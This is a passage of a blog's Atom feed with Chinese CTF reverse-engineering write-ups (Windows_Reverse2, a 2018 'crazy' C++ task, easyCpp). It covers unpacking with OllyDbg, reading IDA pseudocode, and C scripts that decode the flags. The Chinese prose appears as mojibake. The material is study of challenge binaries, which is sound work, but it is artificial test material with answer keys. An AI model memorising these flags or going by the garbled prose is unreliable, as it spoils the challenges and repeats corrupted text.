<span class="number">102</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">109</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">99</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">127</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">53</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">48</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">107</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">58</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">60</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">59</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">32</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125; B = &#123;</span><br><span class="line">   <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">111</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">56</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">54</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">  <span class="number">124</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">55</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">51</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">52</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">118</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">51</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">98</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, <span class="number">100</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>, <span class="number">122</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_[<span class="number">56</span>];</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">14</span>];</span><br><span class="line">&#125;C = &#123;</span><br><span class="line">   <span class="number">26</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">81</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">5</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">17</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">84</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">86</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">85</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">89</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>, </span><br><span class="line">   <span class="number">29</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">9</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">93</span>,   <span class="number">0</span>, </span><br><span class="line">    <span class="number">0</span>,   <span class="number">0</span>,  <span class="number">18</span>,   <span class="number">0</span>,   <span class="number">0</span>,   <span class="number">0</span></span><br><span class="line">&#125;; </span><br><span class="line"><span class="keyword">char</span> f1[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f2[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, f3[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, ftemp[<span class="number">14</span>] = &#123;<span class="number">0</span>&#125;, temp = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f1[i] = A.a[i] ^ i; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f2[<span class="number">0</span>] = B.a[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">1</span>; i &lt; <span class="number">14</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">f2[i] = A.a[i] ^ B.a[i] ^ A.a[i<span class="number">-1</span>]; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="number">13</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">temp = C.a[i+<span class="number">1</span>] ^ f2[i]; </span><br><span class="line">ftemp[i] = temp ^ i;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f3[<span class="number">0</span>] = <span class="number">0x2D</span>;</span><br><span class="line"><span class="built_in">strcat</span>(f3, ftemp);</span><br><span class="line"></span><br><span class="line"><span class="built_in">strcat</span>(flag, f1);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f2);</span><br><span class="line"><span class="built_in">strcat</span>(flag, f3);</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(flag); </span><br><span class="line"></span><br><span class="line"> <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503174824411-1590490553835-1591162556782.png" alt="image-20200503174824411-1590490553835"></p><ul><li>ä¸‹é¢è¯´ä¸€æ­¥åˆ°ä½.æ‰¾åˆ°æœ€åä¸€ä¸ªå‡½æ•°æœ€åèµ‹å€¼ä»£ç çš„åœ°å€. å¤åˆ¶ä¸‹æ¥<img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503175027583-1590490558591-1591162567556.png" alt="image-20200503175027583-1590490558591"></li><li>è¿›å»OD, è·³åˆ°è¿™ä¸ªåœ°å€ä¸‹æ–­ç‚¹, è¿è¡Œèµ·æ¥. çœ‹æ•°æ®çª—å£. <img src="/2020/04/29/re%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%EF%BC%882%EF%BC%89/image-20200503175154926-1590490566331-1591162575032.png" alt="image-20200503175154926-1590490566331"></li><li><strong>æ€»ç»“: (1)æ³¨æ„è¿™ç§flagå’Œè¾“å…¥å­—ç¬¦æ— å…³çš„çš„é¢˜. (2)è¿™é‡Œ idaä¸­çš„å†…å­˜å–å€¼ä¸ODä¸­çš„å·®å¼‚.</strong></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Windows-Reverse2&quot;&gt;&lt;a href=&quot;#Windows-Reverse2&quot; class=&quot;headerlink&quot; title=&quot;Windows_Reverse2&quot;&gt;&lt;/a&gt;Windows_Reverse2&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¦–å…ˆ,å› ä¸ºæ˜¯ä¸ª.exeæ–‡ä»¶, å…ˆæ‰“å¼€çœ‹ä¸€ä¸‹ç¨‹åºæ˜¯åšä»€ä¹ˆçš„, å‡ºç° &lt;strong&gt;input code:&lt;/strong&gt; ä¹Ÿå°±æ˜¯è®©æˆ‘ä»¬è¾“å…¥ä¸€ä¸ªå¯†ç éªŒè¯.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;ç”¨idaæ‰“å¼€, è¿˜æ˜¯å…ˆ shift + 12 æœç´¢ä¸€ä¸‹å­—ç¬¦ä¸², ç„¶è€Œå¹¶æ²¡æœ‰å‘ç°æˆ‘ä»¬æ‰“å¼€ç¨‹åºçœ‹åˆ°çš„ *&lt;em&gt;input code: *&lt;/em&gt;,å¹¶ä¸”ç¨‹åºå‡½æ•°ä¹Ÿå¾ˆå°‘, é‚£å°±æ˜¯åŠ å£³äº†çš„. å¼€å§‹ä¹Ÿå¿˜äº†ç”¨è½¯ä»¶æŸ¥ä¸€ä¸‹å£³.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;é‚£ä¹ˆç”¨ODæ‰“å¼€, ä½¿ç”¨å †æ ˆå¹³è¡¡çš„æ–¹æ³•, æ‰¾åˆ°ç¨‹åºçš„ OEP, ç„¶ådump, ä½†æ˜¯æ³¨æ„æ”¹ä¸€ä¸‹åŠ è½½çš„åˆå§‹åœ°å€å’Œå…¥å£ç‚¹,   è¿™ä¸ªç¨‹åºå¹¶ä¸æ˜¯ 0x400000å¼€å§‹, æ¯æ¬¡åŠ è½½éƒ½æ˜¯ä¸ä¸€æ ·çš„åœ°å€,åº”è¯¥æ˜¯ ASLRä¿æŠ¤æŠ€æœ¯å§, ä¹‹å‰æœ‰äº†è§£è¿‡ä¸€äº›.é€šè¿‡å†…å­˜çª—å£, çŸ¥é“äº†æ˜¯ 0x1F0000.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>.cpp é€†å‘</title>
    <link href="https://www.bxnop.cn/2020/04/27/cpp-%E9%80%86%E5%90%91/"/>
    <id>https://www.bxnop.cn/2020/04/27/cpp-%E9%80%86%E5%90%91/</id>
    <published>2020-04-27T11:35:58.000Z</published>
    <updated>2020-06-12T08:54:50.826Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ç™¾è¶Šæ¯2018-crazy"><a href="#ç™¾è¶Šæ¯2018-crazy" class="headerlink" title="ç™¾è¶Šæ¯2018: crazy"></a>ç™¾è¶Šæ¯2018: crazy</h2><ul><li><p>é¦–å…ˆ, è¿™é“é¢˜çš„ç®—æ³•å¾ˆç®€å•, å°±æ˜¯è€ƒå¼•ç”¨C++çš„å­—ç¬¦ä¸²ç±»çš„å‡½æ•°. ä½†æ˜¯è‡ªå·±ä¹ŸæŒ–æ˜äº†ä¸€äº›æ„Ÿè§‰æœ‰ç”¨çš„ä¸œè¥¿, ä¸»è¦æ˜¯é€šè¿‡è¿™é“é¢˜æ€»ç»“ c++å­—ç¬¦ä¸²ç±».</p></li><li><p>æ‹–å…¥ExeinfoPe, é¢˜ç›®æ˜¯64ä¸ºelfæ–‡ä»¶, ç”¨64ä¸ºidaæ‰“å¼€.</p></li><li><p>æ‰¾åˆ°ä¸»å‡½æ•°,  æŸ¥çœ‹ä¼ªä»£ç , å‘ç°å¾ˆå†—é•¿, ä½†å¤§å¤šæ•°éƒ½æ˜¯é‚£äº›å­—ç¬¦ä¸²ç±»å‡½æ•°å’Œæ— ç”¨çš„ä¿¡æ¯. æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç‚¹å‡»æœ€åæ¯”è¾ƒè¦ç”¨åˆ°çš„å­—ç¬¦ä¸²çš„åç§°, è¿™æ—¶ä¼šæŠŠæ‰€æœ‰ç›¸åŒåç§°éƒ½é«˜äº®æ˜¾ç¤ºå‡ºæ¥, å°±å¯ä»¥é€šè¿‡é€»è¾‘åˆ¤æ–­å‡ºé‚£äº›æ˜¯å…³é”®å‡½æ•°å’Œå˜é‡.<a id="more"></a></p></li><li><p>ç¬¬ä¸€ä¸ªå…³é”®å‡½æ•°  <strong>HighTemplar::HighTemplar((DarkTemplar *)&amp;v23, (__int64)&amp;input);</strong> </p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200427213407581.png" alt="image-20200427213407581"></p></li><li><p>ç¬¬äºŒä¸ªå…³é”®å‡½æ•° <strong>HighTemplar::calculate((HighTemplar *)&amp;v23);</strong></p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200427213610870.png" alt="image-20200427213610870"></p></li><li><p>ç¬¬ä¸‰ä¸ªå…³é”®å‡½æ•° <strong>HighTemplar::getSerial((HighTemplar *)&amp;v23)</strong></p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200427213959893.png" alt="image-20200427213959893"></p></li><li><p>æœ€åwp: ä½†æ˜¯è¦å¼•èµ·æ³¨æ„çš„æ˜¯è¿™ä¸ªflagçœŸçš„å¥‡æ€ª, å¼€å§‹ä»¥ä¸ºç®—é”™äº†,æ£€æŸ¥å‡ é, æœ€åå°±æ˜¯è¿™ä¸ª <strong>tMx~qdstOs~crvtwb~aOba}qddtbrtcd</strong>  å†åŠ ä¸Šflag{}.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> a[] = <span class="string">"327a6c4304ad5938eaf0efb6cc3e53dc"</span>;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">char</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(a); i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i] = (a[i] - <span class="number">11</span>) ^ <span class="number">0x13</span>;</span><br><span class="line">a[i] = (a[i] - <span class="number">23</span>) ^ <span class="number">0x50</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">puts</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“:"></a><strong>æ€»ç»“:</strong></h3><ul><li><p>å…ˆè¯´ä¸€ä¸‹åšè¿™ä¸ªé¢˜æƒ³è¿‡çš„ä¸€ä¸ªé—®é¢˜.  æˆ‘ä»¬çŸ¥é“ <strong>rodata</strong> æ®µæ˜¯åªè¯»çš„, å­˜æ”¾å¸¸é‡ç­‰, ä½†æ˜¯è¿™é‡Œå´æœ‰å­—ç¬¦ä¸²åœ°å€çš„èµ‹å€¼, ä»–æŠŠ <strong>0x401EA0</strong> åœ°å€çš„å€¼æ”¹å˜äº†, ä½†ä¸ºä»€ä¹ˆå¯ä»¥è¿™æ ·å‘¢, æŸ¥äº†èµ„æ–™, ä¹Ÿæƒ³äº†å¾ˆä¹…, æœ€åè®¤ä¸ºåº”è¯¥æ˜¯å­˜æ”¾çš„æŒ‡é’ˆ,è€Œä¸”æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™ä¸€æ®µéƒ½æ˜¯8å­—èŠ‚çš„å¢åŠ , éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆ 8å­—èŠ‚çš„å¤§å°.</p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200427215217839.png" alt="image-20200427215217839"></p><p>è¿™é‡Œä¹Ÿé€šè¿‡æŸ¥èµ„æ–™, çŸ¥é“äº†ä»¥å‰å­¦ä¹ æŒ‡é’ˆçš„ç–‘é—®.</p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200427215908475.png" alt="image-20200427215908475"></p><p><strong>å› ä¸ºæˆ‘ä»¬åˆå§‹åŒ–ä¸€ä¸ªæ•°ç»„æ—¶,æ•°ç»„çš„åˆå§‹å€¼æ”¾åœ¨rodataæ®µé‡Œé¢.æ•°ç»„å¯¹åº”å¼€è¾Ÿçš„ç©ºé—´ä¸Šçš„æ•°å€¼å­˜æ”¾åœ¨æ ˆä¸Š,ç¼–è¯‘å™¨ä¼šå»è®¿é—®rodataæ®µä¸Šçš„åˆå§‹å€¼ç„¶åå–æ¥åˆå§‹åŒ–å±€éƒ¨å˜é‡ï¼Œå› æ­¤æ•°ç»„çš„å€¼æ‰èƒ½ä¿®æ”¹. è€ŒæŒ‡é’ˆæŒ‡å‘çš„æ˜¯rodataæ®µï¼Œæ˜¯ä¸èƒ½è¢«ä¿®æ”¹çš„</strong>.</p></li><li><p>ç¬¬äºŒä¸ªå°±æ˜¯é€šè¿‡c++å®˜æ–¹æ‰‹å†Œçš„æŸ¥è¯¢å¯¹å„ç§c++å¼•ç”¨çš„å„ç§å­—ç¬¦ä¸²çš„æ€»ç»“. ä¸‹é¢çš„ a b ä¸ºå­—ç¬¦æ•°ç»„.</p><table><thead><tr><th align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::operator[](a, i)</char></char></th></tr></thead><tbody><tr><td align="left">å³ <strong>a[i]</strong> çš„æ„æ€, å¦‚æœoperatoråé¢æ²¡æœ‰ <strong>[]</strong>, é‚£å°±æ˜¯  <strong>a+i</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::basic_string(a, b, lenth)</char></char></td></tr><tr><td align="left">å³  <strong>strncpy(a, b, lenth)</strong>  ç¬¬ä¸‰ä¸ªå‚æ•°å¯é€‰</td></tr><tr><td align="left">std::allocator<char>::~allocator(a)  <strong>å‘ç°åªè¦å‰é¢æœ‰ä¸ª ~ çš„éƒ½æ˜¯é‡Šæ”¾</strong>.</char></td></tr><tr><td align="left">å³ <strong>free(a)</strong></td></tr><tr><td align="left">std::__cxx11::basic_string&lt;char,std::char_traits<char>,std::allocator<char>&gt;::length(a)</char></char></td></tr><tr><td align="left">å³ <strong>strlen(a)</strong></td></tr><tr><td align="left">std::operator&lt;&lt;&lt;std::char_traits<char>&gt;(&amp;std::cout, â€œhelloâ€) åé¢æ€»è·Ÿç€ä¸‹é¢ä¸€å¥. <strong>å…³é”®æ˜¯count</strong></char></td></tr><tr><td align="left">std::ostream::operator&lt;&lt;(v1, (__int64)&amp;std::endl&lt;char,std::char_traits<char>&gt;)                                                                     å³  <strong>printf(â€œhelloâ€)</strong></char></td></tr><tr><td align="left">std::operator&gt;&gt;&lt;char,std::char_traits<char>,std::allocator<char>&gt;(&amp;std::cin, &amp;a) <strong>å…³é”®æ˜¯in</strong></char></char></td></tr><tr><td align="left">å³ <strong>gets(a)</strong></td></tr></tbody></table><hr></li></ul><h2 id="easyCpp"><a href="#easyCpp" class="headerlink" title="easyCpp"></a>easyCpp</h2><blockquote><p>C++é€†å‘çš„é¢˜, åˆšå¼€å§‹æ¥è§¦å¾ˆå¤šä»£ç çœ‹ä¸æ‡‚,æ„Ÿè§‰å¯è¯»æ€§ä½.  ä½†æ˜¯çœ‹å¤šäº†, è¿˜æ˜¯ä¼šå¥½å¾ˆå¤š. æ˜¯ä¸€ä¸ªæ…¢æ…¢ç†Ÿæ‚‰stlçš„è¿‡ç¨‹å§.</p></blockquote><ul><li><p>ç»è¿‡äº†ä¸€äº›CPPé€†å‘é¢˜çš„æŠ˜ç£¨, è¿™ä¸ªé¢˜å¤§å¤šæ•°å‡½æ•°è¿æ‡µå¸¦çŒœçš„çœ‹èµ·æ¥è¿˜å¥½, ä½†æ˜¯é‡åˆ°äº†ä¸€ä¸ªä¸ä»”ç»†çš„é”™è¯¯, æƒ³äº†å¾ˆä¹…â€¦..</p></li><li><p>64ä½elfæ–‡ä»¶, è½½å…¥ida, å‡½æ•°çš„å¤§éƒ¨åˆ†è¿˜æ˜¯çœ‹æ‡‚äº†. 2ä¸ªå…³é”®å‡½æ•°.  <strong>transform  accumulate</strong></p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200510182506239.png" alt="image-20200510182506239"></p></li><li><p>å…ˆè¿›å…¥ transform. ç®—æ³•ä¹Ÿæ˜¯å¾ˆç®€å•, å°±æ˜¯å‡½æ•°è¯»èµ·æ¥æ›´éº»çƒ¦.</p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200510182650313.png" alt="image-20200510182650313"></p></li><li><p>ä¸‹é¢ accumulate. è¿™ä¸ªçœ‹èµ·æ¥å°±ä¸æ˜¯é‚£ä¹ˆå®¹æ˜“äº†, æœ‰å¾ˆå¤šåœ°å€ä¼ è¿‡æ¥ä¼ è¿‡å»å°±å¾ˆæ··æ·†. é‚£å°±idaåŠ¨æ€è°ƒè¯•çœ‹çœ‹è¿™ä¸ªå‡½æ•°æ˜¯åšä»€ä¹ˆ.(ä¹Ÿæ˜¯è¿™é‡Œè‡ªå·±æƒ³äº†å¾ˆä¹…çš„é”™è¯¯, è™½ç„¶å¾ˆç®€å•çš„, å¯èƒ½æ˜¯stlæŠŠè‡ªå·±ææ˜äº†å§).</p><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200510183307210.png" alt="image-20200510183307210"></p></li><li><p>å‘ç°é”™è¯¯, é‡æ–°è°ƒè¯•åå¾—åˆ°ç»è¿‡ accumulate å‡½æ•°åçš„ç»“æœ. æŠŠç»“æœéƒ½è®°å½•ä¸‹æ¥å. å‘ç°åªæ˜¯æŠŠ transformå‡½æ•°åçš„ç»“æœè¿›è¡Œäº†é€†åº.<img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200510183543551.png" alt="image-20200510183543551"></p></li><li><p>å¼€å§‹å†™ exp:  å¾—åˆ° <strong>987 -377 -610 -754 -843 -898 -932 -953 -966 -974 -979 -982 -984 -985 -986 -986</strong>. æœ€ååœ¨linuxä¸‹è¿è¡Œç¨‹åºè¾“å…¥.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fib</span><span class="params">(<span class="keyword">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!a || a == <span class="number">1</span>)</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> fib(a<span class="number">-1</span>) + fib(a<span class="number">-2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> flag[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;, i = <span class="number">0</span>; </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">flag[i] = fib(i); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(i = <span class="number">15</span>; i &gt;= <span class="number">0</span>; i--)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"%d "</span>, flag[i] = (i &lt; <span class="number">15</span> ? flag[i] - flag[<span class="number">15</span>]:flag[i]));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/27/cpp-%E9%80%86%E5%90%91/image-20200510184751024.png" alt="image-20200510184751024"></p></li><li><p><strong>æ€»ç»“: (1)æ³¨æ„ä¼ é€’çš„å‚æ•°æ˜¯æŒ‡é’ˆè¿˜æ˜¯å€¼. (2)cppé€†å‘å¤ªå¤šæ•°éƒ½æœ‰ä¸€ä¸ªæ¨¡æ¿ä¸€æ ·, åŠ¨æ€è°ƒè¯•æ³¨æ„åœ°å€çš„å¯»æ‰¾.</strong></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;ç™¾è¶Šæ¯2018-crazy&quot;&gt;&lt;a href=&quot;#ç™¾è¶Šæ¯2018-crazy&quot; class=&quot;headerlink&quot; title=&quot;ç™¾è¶Šæ¯2018: crazy&quot;&gt;&lt;/a&gt;ç™¾è¶Šæ¯2018: crazy&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;p&gt;é¦–å…ˆ, è¿™é“é¢˜çš„ç®—æ³•å¾ˆç®€å•, å°±æ˜¯è€ƒå¼•ç”¨C++çš„å­—ç¬¦ä¸²ç±»çš„å‡½æ•°. ä½†æ˜¯è‡ªå·±ä¹ŸæŒ–æ˜äº†ä¸€äº›æ„Ÿè§‰æœ‰ç”¨çš„ä¸œè¥¿, ä¸»è¦æ˜¯é€šè¿‡è¿™é“é¢˜æ€»ç»“ c++å­—ç¬¦ä¸²ç±».&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ‹–å…¥ExeinfoPe, é¢˜ç›®æ˜¯64ä¸ºelfæ–‡ä»¶, ç”¨64ä¸ºidaæ‰“å¼€.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;æ‰¾åˆ°ä¸»å‡½æ•°,  æŸ¥çœ‹ä¼ªä»£ç , å‘ç°å¾ˆå†—é•¿, ä½†å¤§å¤šæ•°éƒ½æ˜¯é‚£äº›å­—ç¬¦ä¸²ç±»å‡½æ•°å’Œæ— ç”¨çš„ä¿¡æ¯. æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç‚¹å‡»æœ€åæ¯”è¾ƒè¦ç”¨åˆ°çš„å­—ç¬¦ä¸²çš„åç§°, è¿™æ—¶ä¼šæŠŠæ‰€æœ‰ç›¸åŒåç§°éƒ½é«˜äº®æ˜¾ç¤ºå‡ºæ¥, å°±å¯ä»¥é€šè¿‡é€»è¾‘åˆ¤æ–­å‡ºé‚£äº›æ˜¯å…³é”®å‡½æ•°å’Œå˜é‡.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
    
    </summary>
    
    
      <category term="Reverse" scheme="https://www.Bxnop.cn/categories/Reverse/"/>
    
    
  </entry>
  
  <entry>
    <title>2020å¹´DASCTFå››æœˆçº¿ä¸Šèµ›</title>
    <link href="https://www.bxnop.cn/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/"/>
    <id>https://www.bxnop.cn/2020/04/25/2020%E5%B9%B4DASCTF%E5%9B%9B%E6%9C%88%E7%BA%BF%E4%B8%8A%E8%B5%9B/</id>
    <published>2020-04-25T11:27:55.000Z</published>
    <updated>2020-05-30T09:22:28.932Z</updated>
    
